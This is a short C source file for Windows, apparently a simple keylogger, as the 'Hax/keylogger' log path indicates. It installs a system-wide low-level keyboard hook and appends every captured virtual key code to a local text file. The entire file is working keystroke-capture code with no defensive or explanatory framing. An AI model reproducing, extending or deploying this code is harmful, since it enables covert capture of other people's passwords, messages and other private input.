#define _WIN32_WINNT 0x0A00

#include <windows.h>
#include <stdio.h>

HHOOK keyboardHook;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, &KeyboardProc, hInstance, 0);
	MSG msg;
	BOOL msgBool;
	while ((msgBool = GetMessage(&msg, NULL, 0, 0)) != WM_QUIT) {
		if (msgBool == -1) {
			printf("Error!\n");
			return -1;
		}
		
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	
	UnhookWindowsHookEx(keyboardHook);
	
	return msg.wParam;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	
	PKBDLLHOOKSTRUCT keyData = (PKBDLLHOOKSTRUCT) lParam;
	
	printf("%i", keyData->vkCode);
	
	FILE *fptr = fopen("C:/Hax/keylogger/local/logged.txt","a+");
	fprintf(fptr, "%i\n", keyData->vkCode);
	fclose(fptr);
	
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}